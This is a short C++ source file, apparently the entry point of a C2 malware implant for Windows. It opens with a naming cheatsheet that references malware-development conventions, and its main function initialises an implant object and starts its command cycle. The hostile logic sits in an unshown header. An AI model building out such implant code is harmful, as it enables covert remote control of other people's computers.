// Implant_v01.cpp : Defines the entry point for the application.
//

/*
 * ======================================================================================
 * C++ VARIABLE NAMING CHEATSHEET/Standard
 * ======================================================================================
 * * 1. LOCAL VARIABLES/Funcs
 * ------------------
 * Google/STL Style : snake_case        (e.g., buffer_size, retry_count)
 * * 2. CLASS MEMBER VARIABLES
 * -------------------------
 * Google Style     : snake_case_       (e.g., buffer_size_, is_connected_)
 * * 3. POINTERS & HANDLES (Common in WinAPI/Malware Dev)
 * ----------------------------------------------------
 * pVariable        : Pointer           (e.g., pBuffer, pContext)
 * ppVariable       : Pointer to Ptr    (e.g., ppOutput)
 * hVariable        : Handle            (e.g., hProcess, hFile)
 * szVariable       : String (Zero term)(e.g., szTargetIp)
 * lpVariable       : Long Pointer      (e.g., lpPayload)
 * * 4. GLOBALS & STATICS
 * --------------------
 * Global           : g_camelCase       (e.g., g_configManager)
 * Static Member    : s_camelCase       (e.g., s_instanceCount)
 * * 5. CONSTANTS & MACROS
 * ---------------------
 * Constants        : kPascalCase       (e.g., kMaxRetries)
 * Macros           : SCREAMING_SNAKE   (e.g., MAX_BUFFER_SIZE, ENABLE_DEBUG)
 * * ======================================================================================
 */
#include <iostream>
#include "core/c2.h"


int main() {
    //call this once to setup the implant
    C2Implant c2implant;
    c2implant.init();
    //C2Implant implant;

    //while (1) {
    //    //on success, break to implant.cycle()
    //    if (c2implant.register_implant() == 1) {
    //        break;
    //    }
    //    //get rid of me, just a debug to prevent a register loop
    //    Sleep(5000);
    //}

    c2implant.cycle();

    return 0;
}

